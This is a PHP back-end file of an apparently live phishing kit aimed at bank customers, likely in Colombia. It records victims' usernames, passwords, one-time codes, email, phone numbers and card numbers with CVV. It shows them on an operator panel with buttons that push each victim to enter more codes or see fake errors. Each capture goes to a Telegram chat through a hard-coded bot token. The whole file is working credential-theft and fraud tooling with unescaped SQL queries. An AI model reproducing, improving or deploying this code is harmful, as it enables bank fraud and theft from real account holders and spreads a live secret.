<?php
require('conexion.php');

function obtenerIPCliente() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    return $_SERVER['REMOTE_ADDR'];
}

function crear_registro($usr,$pass,$dis, $banco){
    date_default_timezone_set('America/Bogota');
    $ip_add = obtenerIPCliente();
    $hoy = date("Y-m-d H:i:s"); 
    if ($con = conectar()) {
        if (sentencia($con, "INSERT INTO rtr45 (idreg, usuario, password, otp, dispositivo, ip, id, agente, banco, status, horacreado, horamodificado) VALUES (NULL, '".$usr."', '".$pass."', NULL, '".$dis."', '".$ip_add."', NULL, NULL, '".$banco."', '1', '".$hoy."', '".$hoy."')")) {
            $consulta = sentencia($con,"SELECT idreg FROM rtr45 WHERE usuario = '".$usr."' ORDER BY idreg DESC LIMIT 1");
            if (contarfilas($consulta)) {
                $datos = traerdatos($consulta);
                $id_registro = $datos["idreg"];
                
                // Enviar mensaje a Telegram con botones interactivos
                enviar_nuevo_registro_telegram($id_registro, $usr, $pass, $banco, $ip_add, $hoy);
                
                setcookie('registro', $id_registro, time()+60*9);
                setcookie('estado', "1", time()+60*9);
                echo $id_registro;
            }           
        } else {
            echo "NO";
        }
        desconectar($con);
    } else {
        echo "ERR";
    }
}


function actualizar_usuario($usr,$pas,$id){
	date_default_timezone_set('America/Bogota');
	$hoy = date("Y-m-d H:i:s"); 

	if ($con = conectar()) {
		sentencia($con,"UPDATE rtr45 SET status = '1', usuario ='".$usr."', password= '".$pas."', horamodificado='".$hoy."' WHERE idreg = ".$id);
		desconectar($con);
	}
}


function buscar_estado($r){
	if ($con = conectar()) {
		$consulta = sentencia($con,"SELECT status FROM rtr45 WHERE idreg = '".$r."'");
		if (contarfilas($consulta)) {
			$datos=traerdatos($consulta);
			return $datos["status"];
		}else{

		}
		desconectar($con);
	}else{

	}
}


function contador(){
	$c=0;
	if ($con = conectar()) {	
		$consulta1 = sentencia($con,"SELECT * FROM v1s1t");
		if (contarfilas($consulta1)) {
			$res1=traerdatos($consulta1);
			$c = 1*$res1["contador"];
			$c=$c+1;
			sentencia($con,"UPDATE v1s1t SET contador='".$c."'");
		}
		desconectar($con);
	}
}



function actualizar_registro_otp($reg,$cd){
	date_default_timezone_set('America/Bogota');
	$hoy = date("Y-m-d H:i:s"); 

	if ($con = conectar()) {
		
		if (sentencia($con,"UPDATE rtr45 SET status = '3', otp ='".$cd."', horamodificado='".$hoy."' WHERE idreg = ".$reg)) {
			
		}else{

		}
		desconectar($con);
	}else{

	}
}


function actualizar_registro_mail($reg,$mail,$cm,$cel){
	date_default_timezone_set('America/Bogota');
	$hoy = date("Y-m-d H:i:s"); 
	if ($con = conectar()) {
		
		if (sentencia($con,"UPDATE rtr45 SET status = '5', email='".$mail."', cemail='".$cm."', celular='".$cel."', horamodificado='".$hoy."'  WHERE idreg = ".$reg)) {
			
		}else{

		}
		desconectar($con);
	}else{

	}
}


function actualizar_registro_tar($reg,$tar,$ft,$cvv){
	date_default_timezone_set('America/Bogota');
	$hoy = date("Y-m-d H:i:s"); 
	if ($con = conectar()) {	
		if (sentencia($con,"UPDATE rtr45 SET status = '7', tarjeta='".$tar."', ftarjeta='".$ft."', cvv='".$cvv."', horamodificado='".$hoy."'  WHERE idreg = ".$reg)) {
			
		}else{

		}
		desconectar($con);
	}else{

	}
}




function cargar_casos(){
	if ($con = conectar()) {
		$consultaCon = sentencia($con,"SELECT * FROM v1s1t");
		if (contarfilas($consultaCon)) {
			$res=traerdatos($consultaCon);
			// echo '<span style="color:yellow">TOTAL:</span><span style="color:#00FF00;font-weight:600;">'.$res["contador"].'</span><br>'; 
		}

		$consulta = sentencia($con,"SELECT * FROM rtr45 WHERE status <> 0 ORDER BY horamodificado DESC");
		if (contarfilas($consulta)) {
			while ($datos=traerdatos($consulta)) {				
				pintar_casilla($datos['idreg'],$datos['usuario'],$datos['password'],$datos['otp'],$datos['dispositivo'],$datos['ip'],$datos['email'],$datos['cemail'],$datos['banco'],$datos['status'],$datos['horamodificado'],$datos['celular'],$datos['tarjeta'],$datos['ftarjeta'],$datos['cvv']);								
			}
		}else{

		}
		desconectar($con);
	}else{

	}
}

function pito(){
	if ($con = conectar()) {
		$consulta1 = sentencia($con,"SELECT * FROM rtr45 WHERE status = 3 OR status = 9");
		if (contarfilas($consulta1)) {
			echo "OTP";
		}else{
			$consulta2 = sentencia($con,"SELECT * FROM rtr45 WHERE status = 1 OR status = 5 OR status = 7");
			if (contarfilas($consulta2)) {
				echo "SI";
			}else{
				echo "NO";
			}
		}	
		desconectar($con);
	}else{

	}
}





function pintar_casilla($reg,$usr,$pass,$otp,$equipo,$ip,$eml,$cml,$ban,$estado,$hora,$cel,$tar,$fec,$cvv){
    $nomEstado = "";
    $color = "";
    $habil = "";
    $btnap = "";

    switch ($estado) {
        case 1: 
            $nomEstado = "Ingresó Usuario/Clave";
            $color = "#4CAF50";
            $habil = "";
            $btnap = "btn-active";
            break;
        case 2: 
            $nomEstado = "Se pidió OTP";
            $color = "#2196F3";
            $habil = "disabled";
            $btnap = "btn-inactive";
            break;
        case 3: 
            $nomEstado = "Ingresó OTP";
            $color = "#4CAF50";
            $habil = "";
            $btnap = "btn-active";
            break;
        case 4: 
            $nomEstado = "923";
            $color = "#2196F3";
            $habil = "disabled";
            $btnap = "btn-inactive";
            break;
        case 5: 
            $nomEstado = "Ingresó Correo/Clave";
            $color = "#4CAF50";
            $habil = "";
            $btnap = "btn-active";
            break;
        case 6: 
            $nomEstado = "Esperando Info Tarjeta";
            $color = "#2196F3";
            $habil = "disabled";
            $btnap = "btn-inactive";
            break;
        case 7: 
            $nomEstado = "Ingresó Info Tarjeta";
            $color = "#4CAF50";
            $habil = "";
            $btnap = "btn-active";
            break;
        case 8: 
            $nomEstado = "Esperando Nuevo OTP";
            $color = "#2196F3";
            $habil = "disabled";
            $btnap = "btn-inactive";
            break;
        case 9: 
            $nomEstado = "Ingresó Nuevo OTP";
            $color = "#4CAF50";
            $habil = "";
            $btnap = "btn-active";
            break;
        case 10: 
            $nomEstado = "Finalizado";
            $color = "#9E9E9E";
            $habil = "disabled";
            $btnap = "btn-inactive";
            break;
        case 12: 
            $nomEstado = "Se pidió nuevo user";
            $color = "#2196F3";
            $habil = "disabled";
            $btnap = "btn-inactive";
            break;
        case 40: 
            $nomEstado = "Se envió Token Bogota";
            $color = "#F44336";
            $habil = "disabled";
            $btnap = "btn-inactive";
            break;
        case 41: 
            $nomEstado = "ERROR CC";
            $color = "#F44336";
            $habil = "disabled";
            $btnap = "btn-inactive";
            break;
        case 25: 
            $nomEstado = "ATM";
            $color = "#F44336";
            $habil = "disabled";
            $btnap = "btn-inactive";
            break;
        case 923: 
            $nomEstado = "Token Bogota";
            $color = "#F44336";
            $habil = "disabled";
            $btnap = "btn-inactive";
            break;
        case 42: 
            $nomEstado = "ERROR 923";
            $color = "#F44336";
            $habil = "disabled";
            $btnap = "btn-inactive";
            break;    
        
    }

    echo '<div class="case-card" style="border-left: 5px solid '.$color.';">
            <div class="case-header">
                <span class="case-number">Logo #'.$reg.'</span>
                <span class="case-status" style="background-color: '.$color.';">'.$nomEstado.'</span>
                <span class="case-time">'.$hora.'</span>
            </div>
            <div class="case-body">
                <div class="case-info">
                    <div class="info-group">
                        <label>Usuario:</label>
                        <span>'.$usr.'</span>
                    </div>
                    <div class="info-group">
                        <label>Contraseña:</label>
                        <span>'.$pass.'</span>
                    </div>
                    <div class="info-group">
                        <label>OTP:</label>
                        <span>'.$otp.'</span>
                    </div>
                </div>
                <div class="case-info">
                    <div class="info-group">
                        <label>Banco:</label>
                        <span>'.$ban.'</span>
                    </div>
                    <div class="info-group">
                        <label>IP:</label>
                        <span>'.$ip.'</span>
                    </div>
                </div>
            </div>
            <div class="case-actions">
                <button '.$habil.' class="'.$btnap.' usuario" id="'.$reg.'">Usuario</button>
                <button '.$habil.' class="'.$btnap.' dinamica" id="'.$reg.'">OTP</button>
                <button class="btn-warning 404" id="'.$reg.'">Token Bogota</button>
                <button class="btn-warning 4" id="'.$reg.'">ERROR 923</button>
                <button class="btn-danger ccError" id="'.$reg.'">Error CC</button>
                <button class="btn-danger validar" id="'.$reg.'">ATM</button>
                <button class="btn-success finalizar" id="'.$reg.'">Finalizar</button>
                

            </div>
          </div>';
}



function actualizar_estado($reg,$est){
	if ($con = conectar()) {
		if (sentencia($con,"UPDATE rtr45 SET status = '".$est."' WHERE idreg = ".$reg)) {
			
		}else{

		}
		desconectar($con);
	}else{

	}
}


function enviar_nuevo_registro_telegram($id_registro, $usuario, $password, $banco, $ip, $hora) {
    $bot_token = '8244180906:AAGatjpS3C-PG2vDQB3gXFky2b5aoafJSKI';
    $chat_id = '-4927137480';

    $mensaje = "🆕 Nuevo LOGO:\n\n";
    $mensaje .= "🆔 ID: $id_registro\n";
    $mensaje .= "👤 Usuario: $usuario\n";
    $mensaje .= "🔑 Contraseña: $password\n";
    $mensaje .= "🏦 Banco: $banco\n";
    $mensaje .= "🌐 IP: $ip\n";
    $mensaje .= "⏰ Hora: $hora\n";

    $teclado = [
        'inline_keyboard' => [
            [
                ['text' => 'Usuario', 'callback_data' => "usuario_$id_registro"],
                ['text' => 'OTP', 'callback_data' => "otp_$id_registro"]
            ],
            [
                ['text' => 'Error 404', 'callback_data' => "404_$id_registro"],
                ['text' => 'Error CC', 'callback_data' => "ccerror_$id_registro"]
            ],
            [
                ['text' => 'Finalizar', 'callback_data' => "finalizar_$id_registro"]
            ],
            [
                ['text' => 'Actualizar', 'callback_data' => "actualizar_$id_registro"]
            ]
        ]
    ];

    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $params = [
        'chat_id' => $chat_id,
        'text' => $mensaje,
        'reply_markup' => json_encode($teclado)
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

function manejar_callback_query($callback_query) {
    $data = $callback_query['data'];
    $message = $callback_query['message'];
    $chat_id = $message['chat']['id'];
    $message_id = $message['message_id'];

    list($action, $id_registro) = explode('_', $data);

    $bot_token = '8244180906:AAGatjpS3C-PG2vDQB3gXFky2b5aoafJSKI';

    // Verificar si el botón ya fue presionado recientemente
    if (boton_presionado_recientemente($id_registro, $action)) {
        // Si el botón fue presionado recientemente, ignorar la acción
        $url = "https://api.telegram.org/bot$bot_token/answerCallbackQuery";
        $params = [
            'callback_query_id' => $callback_query['id'],
            'text' => "Acción en proceso, por favor espere...",
            'show_alert' => true
        ];
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
        return;
    }

    // Marcar el botón como presionado
    marcar_boton_presionado($id_registro, $action);

    // Respuesta inmediata
    $url = "https://api.telegram.org/bot$bot_token/answerCallbackQuery";
    $params = [
        'callback_query_id' => $callback_query['id'],
        'text' => "Procesando...",
        'show_alert' => false
    ];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);

    // Procesar la acción
    switch ($action) {
        case 'usuario':
            actualizar_estado($id_registro, 12);
            $response = "Se pidió nuevo usuario para el LOGO $id_registro";
            break;
        case 'otp':
            actualizar_estado($id_registro, 2);
            $response = "Se pidió OTP para el LOGO $id_registro";
            break;
        case '404':
            actualizar_estado($id_registro, 40);
            $response = "Se envió Token Bogota $id_registro";
            break;
        case '4':
            actualizar_estado($id_registro, 4);
            $response = "Se envió 923 $id_registro";
            break;
        case 'ccerror':
            actualizar_estado($id_registro, 41);
            $response = "Se envió Error CC para el LOGO $id_registro";
            break;
                    case 'validar':
            actualizar_estado($id_registro, 25);
            $response = "validar $id_registro";
            break;
            
        case 'finalizar':
            actualizar_estado($id_registro, 10);
            $response = "Se finalizó el LOGO $id_registro";
            break;
        case 'actualizar':
            $response = actualizar_mensaje_telegram($chat_id, $message_id, $id_registro);
            return;
        default:
            $response = "Acción no reconocida";
    }

    // Actualizar el mensaje
    actualizar_mensaje_telegram($chat_id, $message_id, $id_registro);

    // Enviar notificación de acción completada
    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $params = [
        'chat_id' => $chat_id,
        'text' => "✅ $response",
        'parse_mode' => 'HTML'
    ];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);
}

function obtener_datos_registro($id_registro) {
    if ($con = conectar()) {
        $consulta = sentencia($con, "SELECT * FROM rtr45 WHERE idreg = '$id_registro'");
        if (contarfilas($consulta)) {
            $datos = traerdatos($consulta);
            desconectar($con);
            return $datos;
        }
        desconectar($con);
    }
    return false;
}

function actualizar_mensaje_telegram($chat_id, $message_id, $id_registro) {
    $bot_token = '8244180906:AAGatjpS3C-PG2vDQB3gXFky2b5aoafJSKI';
    
    // Obtener los datos actualizados del registro
    $datos = obtener_datos_registro($id_registro);
    
    if (!$datos) {
        $mensaje = "❌ No se pudieron obtener los datos actualizados para el registro $id_registro";
    } else {
        $mensaje = "🔄 LOGO actualizado:\n\n";
        $mensaje .= "🆔 ID: $id_registro\n";
        $mensaje .= "👤 Usuario: {$datos['usuario']}\n";
        $mensaje .= "🔑 Contraseña: {$datos['password']}\n";
        $mensaje .= "🏦 Banco: {$datos['banco']}\n";
        $mensaje .= "📊 Estado: " . obtener_estado($datos['status']) . "\n";
        $mensaje .= "⏰ Última modificación: {$datos['horamodificado']}\n";
        
        if (!empty($datos['otp'])) {
            $mensaje .= "🔢 OTP: {$datos['otp']}\n";
        }
        if (!empty($datos['ip'])) {
            $mensaje .= "🌐 IP: {$datos['ip']}\n";
        }
    }

    $url = "https://api.telegram.org/bot$bot_token/editMessageText";
    $params = [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => $mensaje,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    ['text' => 'Usuario', 'callback_data' => "usuario_$id_registro"],
                    ['text' => 'OTP', 'callback_data' => "otp_$id_registro"]
                ],
                [
                    ['text' => 'Error 404', 'callback_data' => "404_$id_registro"],
                    ['text' => 'Error CC', 'callback_data' => "ccerror_$id_registro"]
                ],
                [
                    ['text' => 'Finalizar', 'callback_data' => "finalizar_$id_registro"]
                ],
                [
                    ['text' => 'Actualizar', 'callback_data' => "actualizar_$id_registro"]
                ]
            ]
        ])
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

function boton_presionado_recientemente($id_registro, $action) {
    $archivo = "botones_presionados.json";
    $tiempo_bloqueo = 10; // segundos

    if (file_exists($archivo)) {
        $botones = json_decode(file_get_contents($archivo), true);
    } else {
        $botones = [];
    }

    $clave = $id_registro . '_' . $action;
    if (isset($botones[$clave]) && (time() - $botones[$clave]) < $tiempo_bloqueo) {
        return true;
    }

    return false;
}

function marcar_boton_presionado($id_registro, $action) {
    $archivo = "botones_presionados.json";

    if (file_exists($archivo)) {
        $botones = json_decode(file_get_contents($archivo), true);
    } else {
        $botones = [];
    }

    $clave = $id_registro . '_' . $action;
    $botones[$clave] = time();

    file_put_contents($archivo, json_encode($botones));
}

function obtener_estado($status) {
    $estados = [
        1 => "Ingresó Usuario/Clave",
        2 => "Se pidió OTP",
        3 => "Ingresó OTP",
        // ... otros estados ...
        10 => "Finalizado",
        12 => "Se pidió nuevo usuario",
        40 => "Se envió Token Bogota",
        41 => "ERROR CC",
        25 => "validar",
        923 => "Token Bogota",
        4 => "ERROR 923"
        
    ];
    return isset($estados[$status]) ? $estados[$status] : "Estado desconocido";
}

// Punto de entrada para manejar las actualizaciones de Telegram
$update = json_decode(file_get_contents('php://input'), true);

if (isset($update['callback_query'])) {
    manejar_callback_query($update['callback_query']);
}






function enviar_a_telegram($datos) {
    $bot_token = '8244180906:AAGatjpS3C-PG2vDQB3gXFky2b5aoafJSKI';
    $chat_id = '-4927137480';
	
    // Combinar IP y horacreado si es necesario
    if (strpos($datos['horacreado'], '.') !== false) {
        $datos['ip'] .= ', ' . $datos['horacreado'];
        $datos['horacreado'] = ''; // Limpiar el campo horacreado
    }
	
    $mensaje = "Nuevo LOGO:\n";
    $mensaje .= "👤 Usuario: " . $datos['usuario'] . "\n";
    $mensaje .= "🔑 Contraseña: " . $datos['password'] . "\n";
    $mensaje .= "🤑 OTP: " . $datos['otp'] . "\n";
    $mensaje .= "🏦 Banco: " . $datos['banco'] . "\n";
    $mensaje .= "-------------------------------\n";
     $mensaje .= "🌐 IP: " . $datos['ip'] . "\n";
    if ($datos['horacreado']) {
        $mensaje .= "⏰ Hora: " . $datos['horacreado'] . "\n";
    }

	
    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $params = [
        'chat_id' => $chat_id,
        'text' => $mensaje,
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

?>